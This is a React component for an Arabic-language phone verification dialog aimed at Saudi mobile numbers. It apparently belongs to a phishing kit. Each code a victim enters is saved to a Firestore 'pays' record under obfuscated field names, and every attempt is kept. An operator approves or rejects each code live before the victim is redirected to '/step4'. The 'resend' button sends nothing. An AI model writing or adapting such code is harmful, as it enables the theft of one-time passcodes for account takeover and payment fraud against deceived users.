"use client"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle, CheckCircle2, Smartphone, Loader2 } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface PhoneOtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
  phoneCarrier: string
  onRejected: () => void
  onShowWaitingModal: (carrier: string) => void
  rejectionError?: string
  isAfterRejection?: boolean
}

export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal, rejectionError, isAfterRejection }: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
  const [error, setError] = useState("")
  const inputRef = useRef<HTMLInputElement | null>(null)
  const allOtps = useRef<string[]>([])

  // Timer countdown
  useEffect(() => {
    if (open && timer > 0 && otpStatus === "waiting") {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [open, timer, otpStatus])

  // Reset on open
  useEffect(() => {
    if (open) {
      setTimer(60)
      setOtp("")
      setOtpStatus("waiting")
      allOtps.current = []
      
      const storedError = localStorage.getItem('phoneOtpRejectionError')
      if (storedError) {
        setError(storedError)
        localStorage.removeItem('phoneOtpRejectionError')
      } else if (rejectionError) {
        setError(rejectionError)
      } else {
        setError("")
      }
      
      inputRef.current?.focus()
    }
  }, [open, rejectionError])

  // Firebase listener for admin decisions when in re-submission mode (STC after rejection)
  useEffect(() => {
    if (!open || !isAfterRejection || otpStatus !== "verifying") return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnap) => {
        if (!docSnap.exists()) return
        const data = docSnap.data()

        if (data.phoneOtpStatus === "approved") {
          setOtpStatus("approved")
          setDoc(doc(db as Firestore, "pays", visitorID), {
            phoneOtpStatus: ""
          }, { merge: true })
          setTimeout(() => {
            window.location.href = "/step4"
          }, 1000)
        } else if (data.phoneOtpStatus === "rejected") {
          setOtpStatus("waiting")
          setOtp("")
          setError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
          setDoc(doc(db as Firestore, "pays", visitorID), {
            phoneOtpStatus: "pending"
          }, { merge: true })
        }
      }
    )

    return () => unsubscribe()
  }, [open, isAfterRejection, otpStatus])

  const handleChange = (value: string) => {
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value)
      setError("")
    }
  }

  const handleVerify = async () => {
    if (otp.length !== 4 && otp.length !== 6) return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    try {
      allOtps.current.push(otp)
      
      setOtpStatus("verifying")
      setError("")

      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v7: otp,
        phoneOtpSubmittedAt: new Date().toISOString(),
        allPhoneOtps: allOtps.current,
        phoneOtpStatus: "verifying",
        phoneOtpUpdatedAt: new Date().toISOString()
      }, { merge: true })

      await addToHistory(visitorID, "_t4", {
        phoneNumber: phoneNumber,
        phoneCarrier: phoneCarrier
      }, "approved")

      await addToHistory(visitorID, "_t5", {
        _v7: otp
      }, "pending")

      // If STC and this is a re-submission after rejection → stay in dialog, don't show STC modal
      if (isAfterRejection && phoneCarrier === "stc") {
        // Keep dialog open in verifying state — listener above handles admin decision
        return
      }

      onOpenChange(false)
      onShowWaitingModal(phoneCarrier)
    } catch (err) {
      console.error("[PhoneOTP] Error submitting OTP:", err)
      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
      setOtpStatus("waiting")
    }
  }

  const handleResend = () => {
    setTimer(60)
    setOtp("")
    setError("")
    setOtpStatus("waiting")
    inputRef.current?.focus()
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md rounded-2xl border-0 shadow-2xl" dir="rtl">
        <DialogHeader className="text-center space-y-4 pb-2">
          <div className="flex justify-center">
            <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#1a5c85] to-[#0e3a57] flex items-center justify-center shadow-lg shadow-blue-200">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
          </div>
          <DialogTitle className="text-xl font-bold text-gray-800">
            التحقق من رقم الجوال
          </DialogTitle>
          <DialogDescription className="text-sm leading-relaxed text-gray-500">
            تم إرسال رمز التحقق المكون من{" "}
            <span className="font-bold text-[#1a5c85]">6 أرقام</span>{" "}
            إلى رقم الجوال
            <br />
            <span className="font-bold text-base text-gray-800 dir-ltr inline-block mt-1">
              +966 {phoneNumber}
            </span>
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-5 py-2">
          {/* Status Alerts */}
          {otpStatus === "verifying" && (
            <div className="flex items-center gap-3 bg-blue-50 border border-blue-200 rounded-xl p-4">
              <Loader2 className="h-5 w-5 text-blue-600 animate-spin flex-shrink-0" />
              <p className="text-sm text-blue-900 font-medium">جاري التحقق من الرمز... يرجى الانتظار</p>
            </div>
          )}

          {otpStatus === "approved" && (
            <div className="flex items-center gap-3 bg-green-50 border border-green-200 rounded-xl p-4">
              <CheckCircle2 className="h-5 w-5 text-green-600 flex-shrink-0" />
              <p className="text-sm text-green-900 font-medium">تم التحقق بنجاح! جاري التحويل...</p>
            </div>
          )}

          {error && (
            <Alert variant="destructive" className="rounded-xl">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* OTP Input */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="000000"
              className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2 rounded-xl focus:border-[#1a5c85] transition-colors"
              disabled={otpStatus === "verifying" || otpStatus === "approved"}
            />
          </div>

          {/* Timer / Resend */}
          <div className="text-center">
            {timer > 0 && otpStatus === "waiting" ? (
              <p className="text-sm text-gray-500">
                إعادة إرسال الرمز بعد{" "}
                <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
              </p>
            ) : otpStatus === "waiting" ? (
              <Button
                variant="link"
                onClick={handleResend}
                className="text-[#1a5c85] font-semibold"
              >
                إعادة إرسال رمز التحقق
              </Button>
            ) : null}
          </div>

          {/* Verify Button */}
          <Button
            onClick={handleVerify}
            disabled={(otp.length !== 4 && otp.length !== 6) || otpStatus === "verifying" || otpStatus === "approved"}
            className="w-full h-13 text-base bg-gradient-to-r from-[#1a5c85] to-[#0e3a57] hover:from-[#154a6d] hover:to-[#0a2e46] text-white font-bold rounded-xl shadow-md disabled:opacity-50"
          >
            {otpStatus === "verifying" ? (
              <span className="flex items-center gap-2 justify-center">
                <Loader2 className="h-4 w-4 animate-spin" />
                جاري التحقق...
              </span>
            ) : "تأكيد الرمز"}
          </Button>

          <div className="bg-gray-50 border border-gray-100 rounded-xl p-3 text-center">
            <p className="text-xs text-gray-500">🔒 رمز التحقق صالح لمدة 10 دقائق فقط</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
